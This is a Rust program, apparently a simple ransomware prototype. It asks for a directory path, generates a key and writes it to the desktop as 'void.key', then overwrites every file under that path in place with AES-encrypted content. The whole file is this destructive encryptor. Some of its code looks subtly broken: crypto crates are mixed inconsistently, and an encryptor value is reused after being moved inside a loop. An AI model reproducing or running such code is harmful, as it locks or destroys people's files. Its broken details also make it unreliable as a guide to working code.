use std::io::{Write, self};
use std::path::{Path, PathBuf};
use generic_array::typenum;
use chacha20poly1305::{
    aead::{KeyInit, OsRng},
    ChaChaPoly1305,
};
use aes::cipher::generic_array::GenericArray;
use std::fs::{read, OpenOptions};
use dirs::desktop_dir;
use crypto::aessafe::AesSafe256Encryptor;
use walkdir::WalkDir;
use aesstream::AesWriter;


fn gen_key(dir: &mut PathBuf) -> GenericArray<u8, typenum::U32> {
    let key = ChaChaPoly1305::<[u8; 32]>::generate_key(&mut OsRng);
    dir.push("void.key");
    let mut file = OpenOptions::new()
        .create(true)
        .write(true)
        .open(&dir)
        .expect("Couldn't open the file");
    file.write_all(&key).expect("Couldn't save the key");
    key
}

fn fetch_dir(start: &str) {
    if let Some(mut desktop) = desktop_dir() {
        let path = PathBuf::from(start);

        if path.is_absolute() && path.exists() {
            let walk = WalkDir::new(&path)
                .into_iter()
                .filter_map(|e| e.ok())
                .filter(|e| e.file_type().is_file());

            let key: GenericArray<u8, typenum::U32> = gen_key(&mut desktop);
            let encryptor: AesSafe256Encryptor = AesSafe256Encryptor::new(&key);

            for file in walk {
                encrypt(file.path(),encryptor);
                //println!("{:?}", file.path());
            }
        } else {
            println!("Invalid path. Please enter a valid, absolute path.");
        }
    }
}

fn encrypt(path: &Path, encryptor: AesSafe256Encryptor) -> (){
    if let Ok(file) = OpenOptions::new().write(true).open(path){
        if let Ok(content) = read(path){
            if let Ok(mut writer) = AesWriter::new(file,encryptor){
                let _ = writer.write_all(&content);
            }
        }
    }
}

fn main(){
    let mut path = String::new();
    println!("Enter a path to encrypt: ");
    io::stdin().read_line(&mut path).expect("Could't read the input");
    fetch_dir(path.trim());
}


